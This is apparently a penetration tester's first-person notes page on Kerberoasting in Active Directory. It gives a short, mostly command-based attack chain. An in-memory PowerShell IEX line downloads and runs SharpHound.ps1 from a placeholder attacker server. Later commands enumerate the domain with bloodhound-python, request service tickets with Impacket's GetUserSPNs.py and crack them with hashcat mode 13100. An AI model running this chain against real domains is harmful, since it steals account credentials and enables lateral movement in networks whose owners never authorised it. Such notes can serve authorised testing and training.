# <h1 align="center" id="heading">Kerberoasting</h1>
The easiest way to enumerate Kerberoastable users is through BloodHound. I can collect BloodHound graphing information for the target domain in a few ways. The easiest and most accurate way is through SharpHound collection. I prefer to run the collection in memory with the following command:
```powershell
IEX(new-Object System.Net.WebClient).DownloadString("http://<attacker_server>/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All
```
If I have valid domain credentials, I can use the Python collector BloodHound.py. This can be run from any platform that has Python support so I do not need to rely solely on Windows. This comes in handy when I find myself on a Domain-joined linux system. I can use the following command to execute the BloodHound graphing information collection:
```console
bloodhound-python -u <username> -p '<password>' -ns <target ip> -d <domain name> -c all
```
This may or may not work depending on the target system! Once I identify Kerberoastable users, I can perform the attack with the following command:
```console
~/tools/impacket/examples/GetUserSPNs.py -dc-ip <domain controller> <domain>/<user>:<password> -request
```
After obtaining a hash, I can attempt to crack the password with the following command (run from Windows host):
```console
hashcat.exe -m 13100 -a 0 hashes.txt rockyou.txt -O
```
Depending on whether or not the user has a weak password, I may or may not be able to crack the ticket. If not, this is most likely not the way forward for lateral movement!
